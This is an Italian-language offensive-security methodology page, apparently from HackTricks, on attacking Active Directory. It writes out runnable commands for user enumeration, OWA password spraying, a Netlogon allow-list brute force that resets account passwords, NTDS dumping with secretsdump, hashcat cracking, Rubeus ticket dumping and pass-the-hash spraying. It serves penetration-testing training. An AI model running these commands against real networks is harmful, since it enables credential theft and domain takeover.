# Metodologia Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Panoramica di base

**Active Directory** serve come tecnologia fondamentale, consentendo agli **amministratori di rete** di creare e gestire in modo efficiente **domini**, **utenti** e **oggetti** all'interno di una rete. È progettato per scalare, facilitando l'organizzazione di un numero esteso di utenti in **gruppi** e **sottogruppi** gestibili, controllando i **diritti di accesso** a vari livelli.

La struttura di **Active Directory** è composta da tre livelli principali: **domains**, **trees** e **forests**. Un **domain** comprende una raccolta di oggetti, come **users** o **devices**, che condividono un database comune. I **trees** sono gruppi di questi domain collegati da una struttura condivisa, e una **forest** rappresenta la raccolta di più trees, interconnessi tramite **trust relationships**, formando il livello più alto della struttura organizzativa. Specifici diritti di **accesso** e **comunicazione** possono essere assegnati a ciascuno di questi livelli.

I concetti chiave all'interno di **Active Directory** includono:

1. **Directory** – Contiene tutte le informazioni relative agli oggetti di Active Directory.
2. **Object** – Indica entità all'interno della directory, inclusi **users**, **groups** o **shared folders**.
3. **Domain** – Funziona come contenitore per gli oggetti della directory, con la possibilità che più domain coesistano all'interno di una **forest**, mantenendo ciascuno la propria raccolta di oggetti.
4. **Tree** – Un raggruppamento di domain che condividono un domain root comune.
5. **Forest** – Il vertice della struttura organizzativa in Active Directory, composta da diversi trees con **trust relationships** tra loro.

**Active Directory Domain Services (AD DS)** comprende una serie di servizi fondamentali per la gestione centralizzata e la comunicazione all'interno di una rete. Questi servizi includono:

1. **Domain Services** – Centralizza l'archiviazione dei dati e gestisce le interazioni tra **users** e **domains**, inclusi i servizi di **authentication** e **search**.
2. **Certificate Services** – Sovrintende alla creazione, distribuzione e gestione di **digital certificates** sicuri.
3. **Lightweight Directory Services** – Supporta applicazioni abilitate alla directory tramite il **LDAP protocol**.
4. **Directory Federation Services** – Fornisce funzionalità di **single-sign-on** per autenticare gli utenti su più web application in una singola sessione.
5. **Rights Management** – Aiuta a proteggere il materiale coperto da copyright regolando la sua distribuzione e il suo uso non autorizzati.
6. **DNS Service** – Fondamentale per la risoluzione dei **domain names**.

Per una spiegazione più dettagliata vedi: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Per imparare come **attaccare un AD** devi **comprendere** molto bene il **Kerberos authentication process**.\
[**Leggi questa pagina se ancora non sai come funziona.**](kerberos-authentication.md)

## Cheat Sheet

Puoi consultare molto su [https://wadcoms.github.io/](https://wadcoms.github.io) per avere una vista rapida dei comandi che puoi eseguire per enumerare/exploitare un AD.

> [!WARNING]
> La comunicazione Kerberos **richiede un full qualifid name (FQDN)** per eseguire le azioni. Se provi ad accedere a una macchina tramite l'indirizzo IP, **userà NTLM e non kerberos**.

## Recon Active Directory (No creds/sessions)

Se hai solo accesso a un ambiente AD ma non hai credenziali/sessioni, potresti:

- **Pentest the network:**
- Scansionare la rete, trovare macchine e porte aperte e provare a **exploitare vulnerabilità** o **estrarre credenziali** da esse (per esempio, [le stampanti potrebbero essere obiettivi molto interessanti](ad-information-in-printers.md).
- L'enumerazione DNS potrebbe fornire informazioni su server chiave nel domain come web, printers, shares, vpn, media, ecc.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Dai un'occhiata alla generale [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) per trovare maggiori informazioni su come fare questo.
- **Controllare l'accesso null e Guest sui servizi smb** (questo non funzionerà sulle versioni moderne di Windows):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Una guida più dettagliata su come enumerare un server smb può essere trovata qui:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Una guida più dettagliata su come enumerare LDAP può essere trovata qui (presta **particolare attenzione all'accesso anonymous**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Raccogliere credenziali [**impersonando servizi con Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Accedere all'host tramite [**abusando del relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Raccogliere credenziali **esponendo** [**falsi servizi UPnP con evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Estrarre username/nome da documenti interni, social media, servizi (principalmente web) all'interno degli ambienti del domain e anche da fonti pubblicamente disponibili.
- Se trovi i nomi completi dei dipendenti dell'azienda, potresti provare diversi **username conventions (**[**leggi questo**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Le convenzioni più comuni sono: _NameSurname_, _Name.Surname_, _NamSur_ (3 lettere di ciascuno), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _lettere casuali e 3 numeri casuali_ (abc123).
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** Controlla le pagine [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) e [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Quando viene richiesto un **invalid username** il server risponderà usando il codice di errore **Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, consentendoci di determinare che lo username era invalido. Gli **username validi** provocheranno o il **TGT in una AS-REP** response oppure l'errore _KRB5KDC_ERR_PREAUTH_REQUIRED_, indicando che l'utente è tenuto a eseguire la pre-authentication.
- **No Authentication against MS-NRPC**: Usando auth-level = 1 (No authentication) contro l'interfaccia MS-NRPC (Netlogon) sui domain controller. Il metodo chiama la funzione `DsrGetDcNameEx2` dopo aver eseguito il binding all'interfaccia MS-NRPC per verificare se l'utente o il computer esiste senza alcuna credenziale. Lo strumento [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementa questo tipo di enumeration. La ricerca si trova [qui](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **Server OWA (Outlook Web Access)**

Se hai trovato uno di questi server nella rete puoi anche eseguire **enumerazione utenti** contro di esso. Per esempio, puoi usare lo strumento [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Puoi trovare liste di usernames in [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  e in questo ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Tuttavia, dovresti avere il **nome delle persone che lavorano nell'azienda** dal passo di recon che avresti dovuto eseguire prima di questo. Con nome e cognome potresti usare lo script [**namemash.py**](https://gist.github.com/superkojiman/11076951) per generare potenziali usernames validi.

### Netlogon vulnerable-channel allow-list abuse (Onelogon)

Anche dopo che **Zerologon** è stato patchato sul DC, gli account esplicitamente allow-listed possono ancora essere esposti al comportamento **legacy/vulnerable Netlogon secure-channel**. La configurazione rischiosa è la GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** o il valore di registro corrispondente **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Quel valore è un **SDDL security descriptor** (vedi [Security Descriptors](security-descriptors.md)). Qualsiasi account o gruppo a cui sia stato concesso il relativo ACE nel DACL può essere preso di mira. Per esempio, `O:BAG:BAD:(A;;RC;;;WD)` allow-lists efficacemente **Everyone**.

Flusso operativo pratico:

1. **Identifica i principal allow-listed** controllando sia **SYSVOL/GPO** sia il **registry live del DC**.
2. **Risolvi i SID** trovati nell'SDDL in utenti/computer AD reali e dai priorità agli **account macchina dei DC**, agli **account di trust** e ad altri machine privilegiati.
3. Tenta ripetutamente l'autenticazione **MS-NRPC / Netlogon** come account allow-listed.
4. Dopo un guess riuscito, abusa del **Netlogon password-setting** per resettare la password dell'account target (il PoC pubblico la imposta a una stringa vuota).

Quick triage / esempi di laboratorio dall'artifact pubblico:
```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
--comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```
Notes:

- Lo **scanner** è utile perché la effective allow-list può esistere in **SYSVOL**, nel **registry**, o in entrambi.
- Il percorso di exploit in sé è importante perché **non richiede privilegi di Domain Admin** una volta identificato un account vulnerabile.
- Compromettere un **Domain Controller machine account** come `DC$` è particolarmente pericoloso perché il reset di quella password può abilitare direttamente percorsi più ampi di **AD takeover**.
- La fattibilità del **brute-force** dipende dalla modalità: l'artefatto pubblico descrive un approccio meet-in-the-middle, un brute force a **24-bit** quando è disponibile un altro computer account, e varianti più lente a **32-bit**.

Detection / hardening notes:

- Controlla la policy della allow-list e rimuovi tutto tranne eccezioni di compatibilità temporanee ed esplicitamente richieste.
- Monitora gli eventi DC **System** **5827/5828/5829/5830/5831** per intercettare connessioni Netlogon vulnerabili negate, scoperte o esplicitamente consentite dalla policy.
- Considera gli account in `VulnerableChannelAllowList` come **high-risk** finché la dipendenza legacy non viene rimossa.

### Knowing one or several usernames

Ok, quindi sai di avere già un username valido ma nessuna password... Allora prova:

- [**ASREPRoast**](asreproast.md): Se un user **non ha** l'attributo _DONT_REQ_PREAUTH_ puoi **richiedere un messaggio AS_REP** per quell'user che conterrà alcuni dati cifrati da una derivazione della password dell'user.
- [**Password Spraying**](password-spraying.md): Proviamo le password più **common** con ciascuno degli users scoperti, magari qualche user sta usando una password debole (tieni a mente la password policy!).
- Nota che puoi anche fare **spray sugli OWA servers** per provare a ottenere accesso ai mail server degli users.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Potresti essere in grado di **ottenere** alcuni challenge **hashes** da crackare tramite **poisoning** di alcuni protocolli della **network**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Se sei riuscito a enumerare l'active directory avrai **più emails e una migliore comprensione della network**. Potresti essere in grado di forzare **relay attacks** NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)  per ottenere accesso all'AD env.

### NetExec workspace-driven recon & relay posture checks

- Usa i **`nxcdb` workspaces** per mantenere lo stato della recon AD per ogni engagement: `workspace create <name>` avvia SQLite DB separati per protocollo sotto `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Cambia vista con `proto smb|mssql|winrm` e elenca i secrets raccolti con `creds`. Elimina manualmente i dati sensibili quando hai finito: `rm -rf ~/.nxc/workspaces/<name>`.
- La discovery veloce della subnet con **`netexec smb <cidr>`** mostra **domain**, **OS build**, **SMB signing requirements** e **Null Auth**. I membri che mostrano `(signing:False)` sono **relay-prone**, mentre i DC spesso richiedono signing.
- Genera gli **hostnames in /etc/hosts** direttamente dall'output di NetExec per facilitare il targeting:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Quando il **SMB relay verso il DC è bloccato** dal signing, verifica comunque la postura **LDAP**: `netexec ldap <dc>` evidenzia `(signing:None)` / weak channel binding. Un DC con SMB signing richiesto ma LDAP signing disabilitato resta un target valido **relay-to-LDAP** per abusi come **SPN-less RBCD**.

### Leak di credenziali di printer lato client → validazione massiva delle credenziali di dominio

- Le UI di printer/web a volte **includono password admin mascherate in HTML**. Visualizzando il source/devtools si può recuperare il cleartext (es. `<input value="<password>">`), consentendo accesso Basic-auth per scansionare/print repository.
- I print job recuperati possono contenere **onboarding docs in plaintext** con password per singolo utente. Mantieni gli abbinamenti allineati durante il testing:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

If you can **access other PCs or shares** with the **null or guest user** you could **place files** (like a SCF file) that if somehow accessed will t**rigger an NTLM authentication against you** so you can **steal** the **NTLM challenge** to crack it:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** tratta ogni NT hash che possiedi già come password candidata per altri formati più lenti il cui materiale della chiave deriva direttamente dall'NT hash. Invece di fare brute-force su lunghe passphrase nei ticket Kerberos RC4, nelle challenge NetNTLM o nelle credenziali cache, alimenti gli NT hash nelle modalità NT-candidate di Hashcat e lasci che verifichi il riuso delle password senza mai conoscere il plaintext. Questo è particolarmente efficace dopo un compromise di dominio, dove puoi raccogliere migliaia di NT hash attuali e storici.

Usa shucking quando:

- Hai un corpus di NT da DCSync, dump SAM/SECURITY, o credential vaults e devi testare il riuso in altri domain/forest.
- Catturi materiale Kerberos basato su RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), risposte NetNTLM o blob DCC/DCC2.
- Vuoi dimostrare rapidamente il riuso di passphrase lunghe e non crackabili e fare subito pivot via Pass-the-Hash.

La tecnica **non funziona** contro i tipi di cifratura i cui key non sono l'NT hash (per esempio, Kerberos etype 17/18 AES). Se un domain impone solo AES, devi tornare alle normali password modes.

#### Building an NT hash corpus

- **DCSync/NTDS** – Usa `secretsdump.py` con history per ottenere il set più grande possibile di NT hash (e dei loro valori precedenti):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

Le entry di history ampliano enormemente il pool di candidati perché Microsoft può memorizzare fino a 24 hash precedenti per account. Per altri modi di raccogliere i secret NTDS vedi:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (o Mimikatz `lsadump::sam /patch`) estrae i dati SAM/SECURITY locali e i logon di dominio cached (DCC/DCC2). Elimina i duplicati e aggiungi questi hash alla stessa lista `nt_candidates.txt`.
- **Track metadata** – Conserva username/domain che ha prodotto ogni hash (anche se la wordlist contiene solo hex). Gli hash corrispondenti ti dicono subito quale principal sta riusando una password una volta che Hashcat stampa il candidate vincente.
- Preferisci candidati dallo stesso forest o da un forest trusted; massimizza così la probabilità di overlap durante lo shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- Gli input NT-candidate **devono rimanere NT hash raw da 32 hex**. Disabilita i rule engines (no `-r`, no hybrid modes) perché le modifiche corrompono il key material candidato.
- Queste mode non sono intrinsecamente più veloci, ma lo spazio chiave NTLM (~30,000 MH/s su un M3 Max) è ~100× più rapido di Kerberos RC4 (~300 MH/s). Testare una lista NT curata è molto meno costoso che esplorare l'intero password space nel formato lento.
- Esegui sempre la **latest Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) perché le mode 31500/31600/35300/35400 sono state introdotte recentemente.
- Al momento non esiste una NT mode per AS-REQ Pre-Auth, e gli AES etypes (19600/19700) richiedono la password in plaintext perché le loro chiavi derivano tramite PBKDF2 da password UTF-16LE, non da NT hash raw.

#### Example – Kerberoast RC4 (mode 35300)

1. Cattura un TGS RC4 per uno SPN target con un user a privilegi bassi (vedi la pagina Kerberoast per i dettagli):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck il ticket con la tua lista NT:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat deriva la chiave RC4 da ogni NT candidate e valida il blob `$krb5tgs$23$...`. Una corrispondenza conferma che l'account di servizio usa uno degli NT hash che già possiedi.

3. Fai subito pivot via PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Se necessario, puoi recuperare il plaintext in seguito con `hashcat -m 1000 <matched_hash> wordlists/`.

#### Example – Cached credentials (mode 31600)

1. Dump dei logon cached da una workstation compromessa:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copia la riga DCC2 per l'utente di dominio interessante in `dcc2_highpriv.txt` e shuckala:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Una corrispondenza riuscita restituisce l'NT hash già noto nella tua lista, dimostrando che l'utente cached sta riusando una password. Usalo direttamente per PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) oppure fai brute-force in modalità NTLM veloce per recuperare la stringa.

Lo stesso identico workflow si applica alle challenge-response NetNTLM (`-m 27000/27100`) e a DCC (`-m 31500`). Una volta identificata una corrispondenza puoi avviare relay, SMB/WMI/WinRM PtH, oppure recraccare l'NT hash con mask/rules offline.



## Enumerating Active Directory WITH credentials/session

Per questa fase devi aver **compromesso le credenziali o una session di un account domain valido.** Se hai credenziali valide o una shell come domain user, **devi ricordare che le opzioni viste prima sono ancora opzioni per compromettere altri users**.

Prima di iniziare l'enumeration autenticata dovresti conoscere il **Kerberos double hop problem**.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Aver compromesso un account è un **grande passo per iniziare a compromettere l'intero domain**, perché potrai iniziare la **Active Directory Enumeration:**

Riguardo [**ASREPRoast**](asreproast.md) ora puoi trovare ogni possibile user vulnerabile, e riguardo [**Password Spraying**](password-spraying.md) puoi ottenere una **lista di tutti gli username** e provare la password dell'account compromesso, password vuote e nuove password promettenti.

- Potresti usare [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- Puoi anche usare [**powershell for recon**](../basic-powershell-for-pentesters/index.html), che sarà più stealthy
- Puoi anche [**use powerview**](../basic-powershell-for-pentesters/powerview.md) per estrarre informazioni più dettagliate
- Un altro tool eccellente per la recon in un active directory è [**BloodHound**](bloodhound.md). Non è **molto stealthy** (a seconda dei collection methods che usi), ma **se non ti importa**, dovresti assolutamente provarlo. Trova dove gli users possono fare RDP, trova path verso altri gruppi, ecc.
- **Altri automated AD enumeration tools sono:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) perché potrebbero contenere informazioni interessanti.
- Un **tool con GUI** che puoi usare per enumerare la directory è **AdExplorer.exe** della suite **SysInternal**.
- Puoi anche cercare nel database LDAP con **ldapsearch** per trovare credenziali nei campi _userPassword_ & _unixUserPassword_, o anche in _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) per altri metodi.
- Se stai usando **Linux**, puoi anche enumerare il domain usando [**pywerview**](https://github.com/the-useless-one/pywerview).
- Potresti anche provare tool automatizzati come:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

È molto facile ottenere tutti gli username del domain da Windows (`net user /domain` ,`Get-DomainUser` or `wmic useraccount get name,sid`). In Linux, puoi usare: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` or `enum4linux -a -u "user" -p "password" <DC IP>`

> Anche se questa sezione di Enumeration sembra piccola, è la parte più importante di tutte. Apri i link (soprattutto quelli di cmd, powershell, powerview e BloodHound), impara a enumerare un domain e fai pratica finché non ti senti a tuo agio. Durante una assessment, questo sarà il momento chiave per trovare la strada verso DA o per decidere che non si può fare nulla.

### Kerberoast

Kerberoasting consiste nell'ottenere **ticket TGS** usati da servizi legati a account user e nel crackare **offline** la loro cifratura, che si basa sulle password degli utenti.

Più informazioni in:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Una volta ottenute alcune credenziali puoi verificare se hai accesso a qualche **machine**. Per questo, puoi usare **CrackMapExec** per tentare la connessione su diversi server con protocolli diversi, in base alle porte trovate con la scansione.

### Local Privilege Escalation

Se hai compromesso credenziali o una session come un normale domain user e hai **accesso** con questo user a **qualsiasi machine nel domain** dovresti provare a trovare un modo per **escalare i privilegi localmente e raccogliere credenziali**. Questo perché solo con privilegi di local administrator potrai **dumpare gli hash di altri users** in memoria (LSASS) e localmente (SAM).

C'è una pagina completa in questo libro su [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) e una [**checklist**](../checklist-windows-privilege-escalation.md). Inoltre, non dimenticare di usare [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

È **molto improbabile** che tu trovi **ticket** nella current user **che ti diano il permesso di accedere** a risorse inattese, ma puoi controllare:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Se sei riuscito a enumerare active directory avrai **più email e una migliore comprensione della rete**. Potresti essere in grado di forzare NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Cerca Creds nelle Condivisioni del Computer | SMB Shares

Ora che hai alcune credenziali di base dovresti controllare se riesci a **trovare** **file interessanti condivisi all'interno dell'AD**. Potresti farlo manualmente, ma è un compito molto noioso e ripetitivo (e ancora di più se trovi centinaia di documenti da controllare).

[**Segui questo link per saperne di più sugli strumenti che puoi usare.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Se puoi **accedere ad altri PC o share** potresti **posizionare file** (come un file SCF) che, se in qualche modo accesso, attiveranno un'autenticazione NTLM contro di te così puoi **rubare** la **NTLM challenge** per crackarla:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Questa vulnerabilità permetteva a qualsiasi utente autenticato di **compromettere il domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**Per le seguenti tecniche un normale utente di dominio non basta, servono privilegi/credenziali speciali per eseguire questi attacchi.**

### Hash extraction

Sperabilmente sei riuscito a **compromettere qualche account local admin** usando [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) incluso il relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalando privilegi localmente](../windows-local-privilege-escalation/index.html).\
Poi, è il momento di dumpare tutti gli hash in memoria e localmente.\
[**Leggi questa pagina sui diversi modi per ottenere gli hash.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Una volta che hai l'hash di un utente**, puoi usarlo per **impersonarlo**.\
Devi usare qualche **tool** che **eseguirà** l'**autenticazione NTLM usando** quell'**hash**, **oppure** potresti creare un nuovo **sessionlogon** e **inject**are quell'**hash** dentro **LSASS**, così quando viene eseguita qualsiasi **autenticazione NTLM**, verrà usato quell'**hash**. L'ultima opzione è ciò che fa mimikatz.\
[**Leggi questa pagina per maggiori informazioni.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Questo attacco mira a **usare l'hash NTLM dell'utente per richiedere ticket Kerberos**, come alternativa al comune Pass The Hash sul protocollo NTLM. Quindi, questo potrebbe essere particolarmente **utile in reti in cui il protocollo NTLM è disabilitato** e solo **Kerberos è अनुमतिto** come protocollo di autenticazione.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Nel metodo di attacco **Pass The Ticket (PTT)**, gli attacker **rubano il ticket di autenticazione di un utente** invece della sua password o dei valori hash. Questo ticket rubato viene poi usato per **impersonare l'utente**, ottenendo accesso non autorizzato a risorse e servizi all'interno di una rete.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Se hai l'**hash** o la **password** di un **amministratore locale** dovresti provare a **login localmente** su altri **PC** con esso.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Nota che questo è piuttosto **noisy** e **LAPS** lo **mitigherebbe**.

### MSSQL Abuse & Trusted Links

Se un utente ha privilegi per **accedere a istanze MSSQL**, potrebbe essere in grado di usarle per **eseguire comandi** nell'host MSSQL (se in esecuzione come SA), **rubare** l'hash NetNTLM o persino eseguire un **relay** **attack**.\
Inoltre, se un'istanza MSSQL è trusted (database link) da un'altra istanza MSSQL, se l'utente ha privilegi sul database trusted, potrà **usare la relazione di trust per eseguire query anche nell'altra istanza**. Questi trust possono essere concatenati e, a un certo punto, l'utente potrebbe riuscire a trovare un database misconfigurato dove può eseguire comandi.\
**I link tra database funzionano anche attraverso forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Le suite di inventario e deployment di terze parti spesso espongono percorsi potenti verso credenziali ed esecuzione di codice. Vedi:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Se trovi qualsiasi oggetto Computer con l'attributo [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) e hai privilegi di domain nel computer, potrai fare il dump dei TGT dalla memoria di ogni utente che effettua login sul computer.\
Quindi, se un **Domain Admin effettua login sul computer**, potrai fare il dump del suo TGT e impersonarlo usando [Pass the Ticket](pass-the-ticket.md).\
Grazie a constrained delegation potresti persino **compromettere automaticamente un Print Server** (sperabilmente sarà un DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Se a un utente o computer è consentita la "Constrained Delegation", sarà in grado di **impersonare qualsiasi utente per accedere ad alcuni servizi in un computer**.\
Quindi, se **comprometti l'hash** di questo utente/computer, sarai in grado di **impersonare qualsiasi utente** (anche domain admins) per accedere ad alcuni servizi.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Avere il privilegio di **WRITE** su un oggetto Active Directory di un computer remoto abilita l'ottenimento di code execution con privilegi **elevated**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

L'utente compromesso potrebbe avere alcuni **privilegi interessanti su alcuni oggetti del dominio** che potrebbero permetterti di **spostarti** lateralmente/**elevare** i privilegi.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Scoprire un **servizio Spool in ascolto** nel dominio può essere **abusato** per **ottenere nuove credenziali** ed **elevare i privilegi**.


